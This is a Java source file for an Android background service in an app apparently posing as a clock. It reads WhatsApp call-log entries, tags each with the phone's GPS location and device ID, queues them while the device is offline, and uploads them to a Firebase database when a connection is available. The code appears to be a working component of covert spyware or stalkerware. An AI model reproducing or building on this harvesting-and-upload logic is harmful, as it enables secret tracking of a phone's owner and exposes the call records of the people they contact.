package com.aftab.clock.Services;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.widget.Toast;

import androidx.annotation.Nullable;

import com.aftab.clock.Model.WhatsappCallLogs;
import com.aftab.clock.Receivers.NetworkChangeReceiver;
import com.aftab.clock.Utills.Constants;
import com.aftab.clock.Utills.FireRef;
import com.aftab.clock.Utills.Functions;
import com.aftab.clock.Utills.SharedPref;

import java.util.ArrayList;

import im.delight.android.location.SimpleLocation;

public class UploadNewWACallLog extends IntentService {
    public static double longitude = 0;
    public static double latitude = 0;
    Context context;
    SharedPref sh;
    WhatsappCallLogs intentWCall;
    private SimpleLocation simpleLocation;

    public UploadNewWACallLog() {
        super("UploadWCallLog");
    }


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {

        assert intent != null;
        intentWCall = (WhatsappCallLogs) intent.getSerializableExtra(Constants.WHATSAPP_A_CALL_LOG);

        simpleLocation = new SimpleLocation(this);
        simpleLocation.beginUpdates();

        longitude = simpleLocation.getLongitude();
        latitude = simpleLocation.getLatitude();

        String deviceID = Functions.getDeviceId(context);


        String latLng = longitude + "," + latitude;


        intentWCall.setLocation(latLng);


        if (!NetworkChangeReceiver.isOnline(context)) {

            ArrayList<WhatsappCallLogs> simSMSArrayList = sh.getWACallLogsList(Constants.WHATSAPP_A_CALL_LOG);
            simSMSArrayList.add(intentWCall);

            sh.saveWACallLogsList(simSMSArrayList, Constants.WHATSAPP_A_CALL_LOG);

            //save to offline
          ///  Toast.makeText(context, "OUT Call", Toast.LENGTH_SHORT).show();

        } else {

          //  Toast.makeText(context, "IN Call", Toast.LENGTH_SHORT).show();

            ArrayList<WhatsappCallLogs> wCallLogsList = sh.getWACallLogsList(Constants.WHATSAPP_A_CALL_LOG);

            if (wCallLogsList != null) {

                if (wCallLogsList.size() > 0) {

                    for (int i = 0; i < wCallLogsList.size(); i++) {

                        WhatsappCallLogs callLogs = wCallLogsList.get(i);


                        String pushId2 = callLogs.getCallDate() + callLogs.getPhoneNumber();


                        FireRef.WhATSAPP_A_CALL_LOG.child(deviceID)
                                .child(callLogs.getPhoneNumber())
                                .child(pushId2)
                                .setValue(callLogs);

                    }
                }
            }

            sh.removeList(Constants.WHATSAPP_A_CALL_LOG);

            Functions.saveCallLogPermissions(context, Functions.getPermissionsLogs(context), intentWCall.getId());

            FireRef.WhATSAPP_A_CALL_LOG.child(deviceID)
                    .child(intentWCall.getPhoneNumber())
                    .child(intentWCall.getId())
                    .setValue(intentWCall).addOnCompleteListener(task ->
                    stopSelf());
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        sh = new SharedPref(context);
        simpleLocation = new SimpleLocation(this);
        simpleLocation.beginUpdates();
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        simpleLocation.endUpdates();
    }
}